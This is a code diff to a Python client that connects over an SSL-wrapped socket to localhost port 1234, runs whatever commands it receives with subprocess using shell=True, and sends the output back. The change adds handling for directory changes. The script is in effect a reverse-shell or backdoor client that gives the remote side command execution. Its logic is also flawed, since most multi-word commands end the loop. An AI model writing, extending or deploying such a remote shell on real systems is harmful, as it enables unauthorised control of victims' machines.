@@ -21,12 +21,23 @@ wrappedSocket.connect(('localhost', 1234))
 
 try:
    while True:
-        received_data = wrappedSocket.recv(4096)
+        received_data = wrappedSocket.recv(1024)
         # Send the output of the command over the SSL connection
         # Execute a system command
 
-        command = subprocess.Popen(received_data.decode().split(),shell=True,stdout=subprocess.PIPE)
-        output, err = command.communicate()
-        wrappedSocket.sendall(output)
+        cmd = received_data.decode().split()
+        print(cmd)
+        received_data = 0
+        if len(cmd) >= 2:
+            if cmd[0] == "cd" or cmd[0] == "CD":
+                os.chdir(cmd[1])
+                output = "changed directory to {}".format(cmd[1])
+                wrappedSocket.sendall(output.encode())
+            else:
+                break
+        else:
+            command = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
+            output, err = command.communicate()
+            wrappedSocket.sendall(output)
 finally:
     wrappedSocket.close()
